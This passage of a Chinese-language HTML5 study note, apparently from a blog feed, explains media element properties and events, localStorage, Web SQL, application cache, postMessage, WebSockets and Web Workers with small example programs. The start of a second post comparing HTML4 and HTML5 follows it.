`加载中...[$&#123;e.loaded&#125;/$&#123;e.total&#125; byte]` &#125; else if (networkState === 3) &#123; x.innerHTML = '记载失败' &#125;&#125;, false); currentSrc 读取播放中的媒体数据的 URL地址，为只读属性 buffered（只读） buffered 属性返回 TimeRanges 对象。该对象表示用户的音视频缓冲范围，缓冲范围指的是已缓冲音视频的时间范围。如果用户在音频中跳跃播放，会得到多个缓冲范围。 语法 1audio|video.buffered 返回值 值 描述 TimeRanges 对象 表示音视频的已缓冲部分。TimeRanges 对象属性：length - 获得音视频中已缓冲范围的数量start(index) - 获得某个已缓冲范围的开始位置end(index) - 获得某个已缓冲范围的结束位置注释：首个缓冲范围的下表是 0。 readyState（只读） 返回媒体当前的播放位置的就绪状态值： HAVE_NOTHING(0)：没有获取到媒体的任何信息，当前的播放位置没有可播放数据 HAVE_METADATA(1)：已经获取到足够的媒体数据，但是当前播放位置没有有效的媒体数据（获取到的媒体数据无效） HAVE_CURRENT_DATA(2)：当前播放位置已经有数据可以播放，但没有获取到可以让播放器前进的数据。当媒体为视频，即当前帧的数据已经获得，也获得了下一帧大数据，或者当前帧已经是最后一帧 HAVE_FUTURE_DATA(3)：当前播放位置已经有数据可以播放，而且也获得到了可以让播放器前进的数据。当媒体为视频时，即当前帧的数据已经获得，而且也获得了下一帧的数据，当前帧是播放的最后一帧时，readyState 属性不可能为 HAVE_FUTURE_DATA HAVE_ENOUGH_DATA(4)：当前播放位置已经有数据可以播放，同时也获得了可以让播放器前进的数据，而且浏览器确认媒体数据以某一种速度可以加载，可以保证有足够的后续数据进行播放。 seeking属性与seekable（只读） seeking属性返回一个布尔值，表示浏览器是否正在请求某一特定播放为孩子的数据，true表示浏览器正在请求数据，false表示浏览器正在停止请求。 seekable返回一个 TimeRanges对象，该对象表示请求到的数据的时间范围。当媒体为视频时，开始时间为请求到视频数据第一帧的时间结束为请求到视频数据最后一帧的时间。 currentTime（可读写）/startTime（只读）/duration（只读） currentTime获取当前播放位置，也可以通过修改currentTime来修改当前播放位置。如果修改的位置上没有可用的媒体数据时，将抛出 INVALID_STATE_ERR 异常。如果修改的位置超出了浏览器在一次请求中可以请求的数据范围，将抛出 INDEX_SIZE_ERR 异常。 startTime 来读取媒体播放的开始时间，通常为0 duration 读取媒体文件总的播放时间 三者单位均为秒 played/paused/ended（均为只读） played 返回一个 TimeRanges 对象，从该对象中可以去读媒体文件的以播放部分的时间段。开始时间为已播放部分的开始时间，结束时间为已播放部分的结束时间。 paused 返回一个布尔值，表示是否处于暂停播放中，true 表示媒体暂停播放，false 表示媒体正在播放 end 返回一个布尔值，表示是否播放完毕，true表示播放完毕，false表示还没有播放完毕 defaultPlaybackRate/playbackRate 前者读取或者修改默认的播放速率，后者可以读取修改当前的播放速率 volume与 muted Volume 读取或者修改媒体的播放音量，范围为0到1。0为静音，1为最大音量 muted读取或者修改媒体的静音状态，布尔值。true表示静音状态，false表示非静音状态 方法video与 audio都有以下四种方法： play。播放媒体，将 paused变为 false pause。暂停媒体，将 paused 变为 true load。重新载入媒体进行播放，将 playbackRate变为 defaultPlaybackRate，error变为 null canPlayType。来测试浏览器是否支持指定的媒体类型。support = videoElement.canPlayType(type)。该方法使用一个参数type，该参数的指定方法与 source元素的type参数的指定方法相同，都用播放文件的 MIME 类型来指定，可以在指定的字符串中加上表示媒体编码格式的 codes参数。该方法返回3个可能值： 空字符串：表示浏览器不支持此种媒体类型 maybe：表示浏览器可能支持此种媒体类型 probably：表示浏览器确定支持此种媒体类型 事件事件处理方式分为两种： addEventListener 获取事件句柄的方式 事件 描述 loadstart 浏览器开始在网上寻找媒体数据 progress 浏览器正在获取媒体数据 suspend 浏览器暂停获取媒体数据，但是下载过程并没有正常结束 abort 浏览器在下载完全部媒体数据之前中止获取媒体数据，但是并不是由错误引起的 error 获取媒体数据过程中出错 emptied video元素或者 audio元素所在网络突然变为未初始状态。可能引起的原因有两个：载入媒体过程中突然发生一个致命错误和在浏览器正在选择支持的播放格式时，又调用了 load 方法重新载入媒体 stalled 浏览器尝试获取媒体数据失败 play 即使开始播放，当执行了 play 方法时触发，或者数据下载完之后元素被谁 autoplay pause 播放暂停，当执行了 pause 方法时触发 loadedmetadata 浏览器获取完毕媒体的时长好字节数 loadeddata 浏览器已经加载完毕当前播放位置的媒体数据，准备播放 waiting 播放过程由于得不到下一帧而暂停播放（例如下一帧尚未加载完毕），但很快就能够播放下一帧 playing 正在播放 canplay 浏览器能够播放媒体，但估计以前播放速率不能直接将媒体播放完毕，播放需要缓冲 canplaythrough 浏览器能够播放媒体，而且以当前播放速率能够将媒体播放完毕，不再需要进行缓冲 seeking seeking属性变为 true，浏览器正在请求数据 seeked seeking属性变成false，浏览器停止请求数据 timeupdate 当前播放位置被改变，可能是播放过程中的自然改变，也可能是人为地改变，或由于播放不能连续而发生的跳变 ended 播放结束后停止播放 ratechange defaultplaybackRate属性（默认播放速率）或 playbackRate属性（当前播放速率）被改变 durationchange 播放时长被改变 volumechange volume（音量）被改变或者 muted（静音状态） 被改变 事件捕捉示例1234video.addEventListener('timeupdate', function () &#123; const timer = document.getElementById('time'); timer.innerHTML = Math.floor(video.currentTime) + '/' + Math.floor(video.duration) + '(秒)';&#125;, false); 本地存储Web Storage我们可以使用 cookies 在客户端保存注入用户等简单的用户信息，但它有一些限制： 大小：cookies大小被限制在 4KB 带宽：cookies 随 HTTP 事务一起被发送，会浪费一部分发送 cookies使用的带宽 复杂度 在 HTML5中重新提供了一种在客户端本地保存数据的功能，就是 Web Storage 功能。它分为两种 sessionStorage 将数据保存在 seesion对象中。所谓的 session，是指用户在浏览某个网站的时候，从进入网站到浏览器关闭所经过这段时间，也就是用户浏览器这个网站所花费的时间，session 对象可以用来保存这时间所要求保存的任何数据、 localStorage 将数据保存在客户端本地的硬件设备（通常值硬盘，但也可以是其他硬件设备）中，即使浏览器被关闭了，该数据仍然存在，下次打开浏览器访问网站仍然可以使用。 123456789101112131415// sessionStorage// 保存数据sessionStorage.setItem(key,value);//读取数据变量 = seesionStorage.getItem(key)// localStorage// 保存数据localStorage.setItem(key,value);// 保存数据变量 = localStorage.getItem(key)// 保存时不允许重复键名。保存后可以修改键值，但是不允许修改键名（只能重新取键名，然后保存键值） 示例：简单 web 留言本1234567891011121314151617181920212223242526272829303132333435363738&lt;body&gt; &lt;h1&gt;简单 Web 留言本&lt;/h1&gt; &lt;textarea name="memo" id="memo" cols="60" rows="10"&gt;&lt;/textarea&gt; &lt;input type="button" value="追加" onclick="saveStorage('memo')"&gt; &lt;input type="button" value="初始化" onclick="clearStorage('msg')"&gt; &lt;hr&gt; &lt;p id="msg"&gt;&lt;/p&gt;&lt;/body&gt;&lt;script&gt; function saveStorage(id) &#123; const data = document.getElementById(id).value; const time = new Date().getTime(); localStorage.setItem(time, data); console.log('数据已经保存了'); loadStorage('msg'); &#125; function loadStorage(id) &#123; let result = `&lt;table border="1"&gt;`; for (let i = 0; i &lt; localStorage.length; i++) &#123; let key = localStorage.key(i); let value = localStorage.getItem(key); let date = new Date(); date.setTime(key); let datestr = date.toGMTString(); result += `&lt;tr&gt;&lt;td&gt;$&#123;value&#125;&lt;/td&gt;&lt;td&gt;$&#123;datestr&#125;&lt;/td&gt;&lt;/tr&gt;` &#125; result += `&lt;/table&gt;`; let target = document.getElementById(id); target.innerHTML = result; &#125;; function clearStorage() &#123; localStorage.clear(); console.log('全部数据被清除'); loadStorage('msg'); &#125;&lt;/script&gt; 示例：简易数据库12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;body&gt; &lt;h1&gt;简易数据库&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;姓名：&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="name"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;EMAIL:&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="email"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;电话号码:&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="tel"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;备注:&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="memo"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input type="button" onclick="saveStorage()" value="保存"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;p&gt;检索： &lt;input type="text" id="find"&gt; &lt;input type="button" value="检索" onclick="findStorage('msg')"&gt; &lt;/p&gt; &lt;p id="msg"&gt;&lt;/p&gt;&lt;/body&gt;&lt;script&gt; function saveStorage() &#123; let data = new Object; data.name = document.getElementById('name').value; data.email = document.getElementById('email').value; data.tel = document.getElementById('name').value; data.memo = document.getElementById('memo').value; let str = JSON.stringify(data); localStorage.setItem(data.name, str); console.log('数据已经保存了'); &#125; function findStorage(id) &#123; let find = document.getElementById('find').value; let str = localStorage.getItem(find); let data = JSON.parse(str); let result = `姓名： $&#123;data.name&#125;&lt;br&gt;`; result += `EMAIL： $&#123;data.email&#125;&lt;br&gt;`; result += `电话号码： $&#123;data.tel&#125;&lt;br&gt;`; result += `备注： $&#123;data.memo&#125;&lt;br&gt;`; let target = document.getElementById(id); target.innerHTML = result; &#125;&lt;/script&gt; 本地数据库(新的推荐IndexedDB实现)HTML5中内置了一个可以通过 SQL 语言来访问的数据库 1let db = openDatabase('mydb','1.0','Test DB',2*1024*1024) openDatabase接收五个参数： 数据库名字 数据库版本号 显示名字 数据库保存数据的大小（以字节为单位 ) 回调函数（非必须) transaction 方法来执行事务处理，防止在对数据库进行访问以及有关操作的时候收到外界的干扰。当一条语法执行失败的时候，整个事务会回滚 1234db.transaction(function(context)&#123; context.executeSql('CREATE TABLE IF NOT EXISTS tesTable (id unique,name)'); context.executeSql('INSERT INTO testTable(id,name) VALUES (0,"haha")')&#125;) executeSql 方法 1transaction.executeSql(sqlquery,[],dataHandler,errorHandler); executeSql 接收四个参数： 查询字符串 用以替换查询字符串中问号的参数 执行成功回调函数（可选） 执行失败回调函数（可选） 1transaction.executeSql("UPDATE people set age=?where name=?;",[age,name],(transaction,result)=&gt;&#123;&#125;,(transaction,errmsg)=&gt;&#123;&#125;) 实例：留言本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;body onload="init()"&gt; &lt;h1&gt;使用数据库实现的 Web 留言本&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;姓名：&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="name"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;留言：&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="memo"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input type="button" value="保存" onclick="saveData()"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;table id="datatable" border="1"&gt;&lt;/table&gt; &lt;p id="msg"&gt;&lt;/p&gt;&lt;/body&gt;&lt;script&gt; let datatable = null; let db = openDatabase('MyData', '', 'My Database', 102400); function init() &#123; console.log(datatable.childNodes); datatable = document.getElementById('datatable'); showAllData(); &#125; function removeAllData() &#123; for (let i = datatable.childNodes.length - 1; i &gt;= 0; i--) &#123; datatable.removeChild(datatable.childNodes[i]); &#125; let tr = document.createElement('tr'); let th1 = document.createElement('th'); let th2 = document.createElement('th'); let th3 = document.createElement('th'); th1.innerHTML = '姓名'; th2.innerHTML = '留言'; th3.innerHTML = '时间'; tr.appendChild(th1); tr.appendChild(th2); tr.appendChild(th3); datatable.appendChild(tr); &#125; function showData(row) &#123; let tr = document.createElement('tr'); let td1 = document.createElement('td'); td1.innerHTML = row.name; let td2 = document.createElement('td'); td2.innerHTML = row.message; let td3 = document.createElement('td'); let t = new Date(); t.setTime(row.time); td3.innerHTML = t.toLocaleDateString() + " " + t.toLocaleTimeString(); tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3); datatable.appendChild(tr); &#125; function showAllData() &#123; db.transaction(function (tx) &#123; tx.executeSql('CREATE TABLE IF NOT EXISTS MsgData(name TEXT,message TEXT,time INTEGER)', []); tx.executeSql('SELECT * FROM MsgData', [], function (tx, rs) &#123; removeAllData(); for (let i = 0; i &lt; rs.rows.length; i++) &#123; showData(rs.rows.item(i)); &#125; &#125;) &#125;); &#125; function addData(name, message, time) &#123; db.transaction(function (tx) &#123; tx.executeSql('INSERT INTO MsgData VALUES(?,?,?)', [name, message, time], function (tx, rs) &#123; console.log('成功保存数据'); &#125;, function (tx, error) &#123; console.log(`$&#123;error.source&#125;:$&#123;error.message&#125;`); &#125;) &#125;) &#125; function saveData() &#123; let name = document.getElementById('name').value; let memo = document.getElementById('memo').value; let time = new Date().getTime(); addData(name, memo, time); showAllData(); &#125;&lt;/script&gt; 不过，Web SQL Database规范已经被废弃。因为每个浏览器都有自己的实现，浏览器的兼容性就不重要了。 关于 IndexedDB 离线应用程序（已废弃）HTML5 引入了应用程序缓存，这意味着 web 应用可进行缓存，并可在没有因特网连接时进行访问。 应用程序缓存为应用带来三个优势： 离线浏览 - 用户可在应用离线时使用它们 速度 - 已缓存资源加载得更快 减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源。 本地缓存与浏览器网页缓存的区别 本地缓存为整个 Web 程序服务的，浏览器的网页缓存只服务于单个网页。任何网页都有网页缓存，而本地缓存值缓存指定的网页。本地缓存可以控制缓存更新，利用缓存对象的各种属性、状态和事件来开发出离线应用程序 manifest文件首先在 index.html 中引入 123&lt;！DOCTYPE html&gt;&lt;html mainfest ='index.appcache'&gt;&lt;/html&gt; 每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。 manifest 文件的建议的文件扩展名是：”.appcache”。 请注意，manifest 文件需要配置正确的 MIME-type，即 “text/cache-manifest”。必须在 web 服务器上进行配置。 Web 应用程序的本地缓存是通过每个页面的 manifest文件来管理的。是一个简单的文件文本，清单列举了需要被缓存或者不需要被缓存的资源文件的文件名以及访问路径。 manifest 文件可分为三个部分： CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存 NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存 FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面） 12345678910111213141516CACHE MANIFEST# 文件开头必须要书写 CACHE MANIFEST# 以下是需要缓存的文件other.htmlimages/1.jpgjs/jquery.jscss/bootstrap.cssNETWORK：login.aspFALLBACK:online.js locale.js# 如果无法建立因特网连接，用 404页面替换/html/目录所有的文件，第一个是 URI资源，第二个是替补/html5/ /404.html 更新缓存 一旦应用被缓存，它就会保持缓存知道下列的情况发生： 用户清空浏览器缓存 manifest 文件被修改 由程序来更新应用缓存 浏览器与服务器的交互过程场景：访问 网站A,以 index.html 为主页，使用 manifest 缓存了 index.html、1.js、1.css、1.jpg几个资源文件。 第一次访问： 浏览器请求访问网站 A 服务器访问 index.html 浏览器解析 index.html，请求页面上的所有资源，包括 HTML/图像文件/CSS/JS/manifest文件等 服务器返回所有资源 浏览器处理 manifest文件，请求 manifest指定的本地缓存的文件，即使3中已经请求过了。如果要求缓存所有文件也是一个比较大的重复过程。 服务器返回所有要求缓存的文件 浏览器对本地缓存文件进行缓存，触发一个事件，通知本地缓存被更新 manifest文件没有被修改，第二次访问： 浏览器再次请求网站A 浏览器发现这个页面被本地缓存，于是使用本地缓存中的 index.html页面 浏览器解析 index.html，使用所有本地缓存中的资源文件 浏览器向服务器请求 manifest 文件 服务器返回一个 304，通知浏览器 manifest没有发生变化 manifest文件被修改了，第三次访问： 浏览器再次请求网站A 浏览器发送这个页面被本地缓存了，于是使用本地缓存中的 index.html页面 浏览器解析 index.html 文件，使用所有本地缓存中的资源文件 浏览器向服务器请求 manifest文件 服务器返回更新过的 manifest文件 浏览器处理 manifest文件，发送文件已经更新了，于是请求所有要求进行本地缓存的资源文件，包括 index.html 本身 浏览器返回要求进行本地缓存的资源文件 浏览器对本地缓存进行更新，存入所有新的资源文件，并且触发一个事件，通知本地缓存被更新了 浏览器缓存过程中会触发一系列事件，该事件处理程序注册在ApplicationCache对象上，此对象是window的applicationCache属性的值。 下面详细描述了加载文档与更新应用缓存的流程： 当浏览器访问一个包含 manifest 特性的文档时，如果应用缓存不存在，浏览器会加载文档，然后获取所有在清单文件中列出的文件，生成应用缓存的第一个版本。 对该文档的后续访问会使浏览器直接从应用缓存(而不是服务器)中加载文档与其他在清单文件中列出的资源。此外，浏览器还会向 window.applicationCache 对象发送一个 checking 事件，在遵循合适的 HTTP 缓存规则前提下，获取清单文件。 如果当前缓存的清单副本是最新的，浏览器将向 applicationCache 对象发送一个 noupdate 事件，到此，更新过程结束。注意，如果你在服务器修改了任何缓存资源，同时也应该修改清单文件，这样浏览器才能知道它需要重新获取资源。 如果清单文件已经改变，文件中列出的所有文件—也包括通过调用 applicationCache.add() 方法添加到缓存中的那些文件—会被获取并放到一个临时缓存中，遵循适当的 HTTP 缓存规则。对于每个加入到临时缓存中的文件，浏览器会向 applicationCache 对象发送一个 progress 事件。如果出现任何错误，浏览器会发送一个 error 事件，并暂停更新。 一旦所有文件都获取成功，它们会自动移送到真正的离线缓存中，并向 applicationCache对象发送一个 cached 事件。鉴于文档早已经被从缓存加载到浏览器中，所以更新后的文档不会重新渲染，直到页面重新加载(可以手动或通过程序). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556//载入的时候，检查该清单文件。window.applicationCache.onchecking = function()&#123; $("san").innerHTML = "checking for a new version"; return false;&#125;//如果清单文件没有动，同时应用程序也已经缓存了，该事件执行。window.applicationCache.onnoupdate = function()&#123; $("san").innerHTML = "This version is up-to-date"; return false;&#125;//如果还未缓存应用程序，或者清单有改动window.applicationCache.ondownloading = function()&#123; $("san").innerHTML = "Downloading new version"; window.progresscount = 0; //在下面的事件中用到 return false;&#125;//下载过程不断调用progress事件，通常在每个文件下载完的时候。window.applicationCache.onprogress = function(e)&#123; var progress = ""; if(e &amp;&amp; e.lengthComputable)&#123; progress = "" + Math.round(100*e.loaded / e.total) + "%"; //计算下载完成比例 &#125; else&#123; progress = "(" + ++progresscount + ")"; //输出调用次数。 &#125; $("san").innerHTML = "Downloading new version" + progress; return false;&#125;//当下载完成并且首次将应用程序下载到缓存中时window.applicationCache.oncached = function()&#123; $("san").innerHTML = "This application is now cached locally" ; return false;&#125;//下载完成并且首次将应用程序下载到缓存中。window.applicationCache.oncached = function() &#123; status("This application is now cached locally"); return false;&#125;;//下载完成并缓存的程序更新后触发，注意触发此事件时，用户任然看到老版本，只有当用户再次载入时才会访问最新版。window.applicationCache.onupdateready = function() &#123; status("A new version has been downloaded. Reload to run it"); return false;&#125;;//处于离线时，检查清单失败触发。 window.applicationCache.onerror = function() &#123; status("Couldn't load manifest or cache application"); return false;&#125;; //程序引用一个不存在的清单文件触发，同时将应用从缓存中删除。window.applicationCache.onobsolete = function() &#123; status("This application is no longer cached. " + "Reload to get the latest version from the network."); return false;&#125;; 通信 API跨文档消息传输可以在不同网页文档、不同端口、不同域之间进行消息传递。 HTML5 提供了在网页文档之间互相接受与发送消息的功能，只要获取到网页所在窗口对象的实例，不仅同源（域+端口号）的 Web 之间可以互相通信，甚至可以实现跨域通信。 12345678910window.postMessage();// 这个方法可以安全实现跨域通信。提供了一个受控禁止来规避同源策略的限制。这个方法被调用时，会在所有页面脚本执行完毕之后向目标窗口派发一个 MessageEvent 消息。这个消息有四个属性：message属性表示 message类型，data属性为 window.postMessage的第一个参数；origin属性表示调用 window.postMessage方法调用页面的当前状态；source属性记录调用 window.postMessage方法的窗口消息otherWindow.postMessage(message,targetOrigin,[transfer]);/*** otherWindow 其他窗口的一个引用，比如 iframe的contentWindow属性，执行 window.open返回的窗口对象，或者是命名过或数值索引的 window.frames* message 将要发送到其他 window的数据，会被结构化克隆算法序列化。意味着不受什么限制将数据对象安全传送给目标窗口不用自己序列化* targetOrigin 通过窗口的 origin 属性来指定哪些窗口能接受到消息时间。可以是“*”或者一个URI.如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；* transfer 可选 是一串和 message同时传递的 Transferable 对象，这些对象的所有权将被转移给消息的接收方，而发送一方不再保有所有权。*/ 派发事件 12345678910111213window.addEventListener('message',receiveMessage,false);function receiveMessage(event)&#123; let &#123; origin,data,source&#125; = event; if(origin !== 'http://example.com:8080') return; console.log(source+':'+data);&#125;/*** message的属性;* data 从其他 window 传递来的对象* origin 调用 postMessage 时消息发送方窗口的 origin，不能保证是该窗口当前的 或者 未来的origin，因为 postMessage被调用后可能被导航到不同的位置* source 对发送消息窗口的引用，可以使用这个在具有不同 origin 的两个窗口建立双向通信*/ 示例 12345678910111213// A窗口域名是 http://example.com:8080 下面是 A 窗口 script 里面代码let popup = window.open(...popup details...);// 如果弹出框没有被阻止且加载完成// 这行语句没有发送信息出去，即使假设当前页面没有改变location（因为targetOrigin设置不对）popup.postMessage("The user is 'bob' and the password is 'secret'","https://secure.example.net");// 假设当前页面没有改变location，这条语句会成功添加message到发送队列中去（targetOrigin设置对了）popup.postMessage("hello there!","http://example.com");function receiveMessage(event)&#123; if(event.origin !== 'http://example.org') return&#125;window.addEventListener('message',receiveMessage,false); 12345678910// 弹出页 popup域名是 http://example.org 下面是 script 里面代码//当A页面postMessage被调用后，这个function被addEventListenner调用function receiveMessage(event)&#123; if(event.origin !== 'http://example.com:8080') return // event.data 是 "hello there!" // event.source 就当前弹出页的来源页面 event.source.postMessage("hi there yourself! the secret response " +"is: rheeeeet!",event.origin);&#125;window.addEventListener("message", receiveMessage, false); Web Sockets 通信使用 Web Sockets API 可以在服务器与客户端之间建立一个非 HTTP 的双向连接。这个连接是实时的，也是要永久的，除非某一方显示关闭。 常量 Constant Value WebSocket.CONNECTING 0 WebSocket.OPEN 1 WebSocket.CLOSING 2 WebSocket.CLOSED 3 以上是WebSocket 构造函数的原型中存在的一些常量，可通过 WebSocket.readyState 对照上述常量判断 WebSocket 连接 当前所处的状态 用法： 1234567891011121314151617181920212223242526// URL字符串以 ws 或者 wss（加密通信时）文字开头const socket = new WebSocket('ws://localhost:8080');socket.addEventListener('open',function(event)&#123; // send方法对服务器发送数据，只能发送文本数据，可以使用 JSON对象把任何 js对象转换为文本数据后发送 socket.send('Hello Server!');&#125;);socket.addEventListerner('message',function(event)&#123; console.log('Message from server',event.data);&#125;);//事件句柄// 接受服务器传过来的数据socket.onmessage = function(event)&#123; let &#123; data &#125; = event&#125;socket.onopen = function(event)&#123; // 开始通信&#125;// 监听 socket 关闭事件socket.onclose = function(event)&#123; // 通信结束时的处理&#125;// 关闭 socket，切断通信连接0000socket.close() 使用 Web Workers 处理线程web worker 是运行在后台的 javaScript，不会影响页面的性能。 创建后台线程的步骤很简单。将需要在后台线程中指定的脚本文件的 URL 地址作为参数，然后创建 Worker对象就可以了 12let worker = new Worker('worker.js');// 后台线程是不能访问到页面或者窗口对象的，所以如果使用到 window对象或者 document对象会以前你错误的发生 可以通过发送和接收消息来与后台线程互相传递数据。通过 Worker 对象的 onmessage 事件句柄活期户后台线程之间的消息 12345worker.onmessage = function(event)&#123; // 处理收到的消息&#125;// message 文本数据worker.postMessage(message); 示例：求和计算12345678910111213141516&lt;body&gt; &lt;h1&gt;从1到给定数值求和&lt;/h1&gt; 输入数值：&lt;input type="text" id="num"&gt; &lt;button onclick="calculate()"&gt;计算&lt;/button&gt; &lt;script&gt; let worker = new Worker('SumCalculate.js'); worker.onmessage = function(event)&#123; console.log(event.data); &#125; function calculate()&#123; let num = parseInt(document.getElementById('num').value,10); worker.postMessage(num); &#125; &lt;/script&gt;&lt;/body&gt; 123456789// SumCalculate.jsonmessage = function (event) &#123; let num = event.data; let result = 0; for (let i = 0; i &lt;= num; i++) &#123; result += i; &#125; postMessage(result);&#125; 示例：与线程进行数据的交互12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;body&gt; &lt;h1&gt;从随机生成的数字中抽取3的倍数并显示&lt;/h1&gt; &lt;table id="table"&gt;&lt;/table&gt; &lt;script&gt; // 随机数组 let intArray = new Array(100); let intStr = ''; // 生成100个随机数 for (let i = 0; i &lt; 100; i++) &#123; intArray[i] = parseInt(Math.random() * 100); if (i != 0) &#123; intStr += ';'; &#125; intStr += intArray[i] &#125; let worker = new Worker('script.js'); worker.postMessage(intStr); worker.onmessage = function (event) &#123; if (event.data != '') &#123; let j; let k; let tr; let td; let intArray = event.data.split(';'); let table = document.getElementById('table'); for (let i = 0; i &lt; intArray.length; i++) &#123; j = parseInt(i / 10, 0); k = i % 10; // 该行不存在 if (k == 0) &#123; // 添加行 tr = document.createElement('tr'); tr.id = 'tr' + j; table.appendChild(tr); &#125; else &#123; tr = document.getElementById('tr' + j); &#125; td = document.createElement('td'); tr.appendChild(td); td.innerHTML = intArray[j * 10 + k]; td.style.backgroundColor = 'blue'; td.style.color = 'white'; td.width = 30; &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt; 123456789101112131415// script.jsonmessage = function (event) &#123; let &#123; data &#125; = event; let returnStr=""; let intArray = data.split(';'); for (let i = 0; i &lt; intArray.length; i++) &#123; if (parseInt(intArray[i]) % 3 == 0) &#123; if (returnStr != '') &#123; returnStr += ';'; &#125; returnStr += intArray[i] &#125; &#125; postMessage(returnStr)&#125; 线程嵌套单层嵌套 123456789101112131415161718192021222324252627// html scriptlet worket = new Worker('script.js')worket.onmessage = function(event)&#123; console.log(event.data)&#125;// script.jsonmessage = function(event)&#123; let &#123; data &#125; = event; let worker = new Worker('script2.js') // 把数据提交给子线程处理 worker.postMessage(JSON.stringfy(data)) worker.onmessage = function(event)&#123; // 把结果返回主页面 postMessage(event.data); &#125;&#125;// script2.jsonmessage = function(event)&#123; let &#123; data &#125; = event; result = someMethod(data); // 将处理好的处理返回 postMessage(result) // 如果不再使用则关闭子线程 close();&#125; 多个线程中进行数据的交互 实现子线程与子线程之间数据交互的，大致需要下面步骤： 先创建发送数据的子线程 执行子线程中的任务，然后把要传递的数据发送给主线程 在主线程接受到子线程传回来的消息时，创建接受数据的子线程，然后把发送数据的子线程中返回的消息传递给接受数据的子线程 执行接受数据子线程中的代码 1234567891011121314151617181920212223242526onmessage = function(event)&#123; let worker; worker = new Worker('worker1.js'); worker.onmessage = function(event)&#123; // 接受子线程中的数据 let &#123; data &#125; = event; worker = new Worker('worker2.js'); // 把从发送数据的子线程中发回的消息传递给接受数据的子线程 worker.postMessage(data); worker.onmessage = function(event)&#123; // 获取接受数据的子线程中传回的数据 let &#123;data&#125; = event; // 把结果发送到主页面 postMessage(data); &#125; &#125;&#125;// worker1.js 发送数据的子线程onmessga = function(event)&#123; let &#123;someData&#125; = event; result = someMethod(someData); postMassage(result); // 关闭子线程 close();&#125; 线程中可用的变量、函数与类 self 表示本线程范围内的作用域 postMessage(message) 向创建线程的源窗口发送信息 onmessage 获取接受消息的事件句柄 importScripts(urls) 导入其他脚本文件，参数为文件的 URL地址，可以导入多个 navigator 与 window.navigator对象类似，具有 appName、platform、userAgent、appVersion这些属性 sessionStorage/localStorage 可以在线程中使用 Web Storage XMLHttpRequest 在线程中处理 Ajax请求 setTimeout/setInterval 在线程中实现定时处理 close 结束本线程 eval/isNaN/escape 使用 javascipt 的核心函数 object 可以创建对象 WebSockets 使用 WebSockets API 来想服务器发送和接收信息]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试官问我HTML5是什么（上）]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E6%88%91HTML5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[学习链接：HTML 5与CSS 3权威指南 W3cScholl HTML5 与 HTML4 的区别常见代码区别： 新增的一些属性： 12345678910111213141516171819&lt;!--html4--&gt;&lt;form&gt; &lt;p&gt; &lt;label&gt; &lt;input name="search" id="search"&gt; &lt;/label&gt; &lt;/p&gt;&lt;/form&gt;&lt;script&gt; document.getElementById('search').focus();&lt;/script&gt;&lt;!--html5--&gt;&lt;form&gt; &lt;p&gt; &lt;label&gt; &lt;input name="search" autofocus&gt; &lt;/label&gt; &lt;/p&gt;&lt;/form&gt; 结构上： 12345678910111213141516&lt;!--html4--&gt; &lt;div id="header"&gt;&lt;/div&gt; &lt;div id="nav"&gt;&lt;/div&gt; &lt;div class="article"&gt; &lt;div class="section"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id="side-bar"&gt;&lt;/div&gt; &lt;div id="footer"&gt;&lt;/div&gt;&lt;!--html5--&gt;&lt;header&gt;&lt;/header&gt;&lt;nav&gt;&lt;/nav&gt;&lt;article&gt; &lt;section&gt;&lt;/section&gt;&lt;/article&gt;&lt;aside&gt;&lt;/aside&gt;&lt;footer&gt;&lt;/footer&gt; HTML 5 要解决的三个问题 Web 浏览器之间的兼容性很低 文档结构不明确 Web应用程序的功能受到了限制 语法的改变HTML 语法是在 SGML(Standard Generalized Markup Language)语言的基础上建立起来的。对于 HTML 的执行在各个浏览器之间没有统一的一个标准。 HTML5 就是围绕这个Web标准，重新定义了一套在现有的 HTML 的基础上修改而来的语法，使它运行在各浏览器时它们都能符合这个通用标准。 HTML5 的标记方法1.内容类型（ContentType） 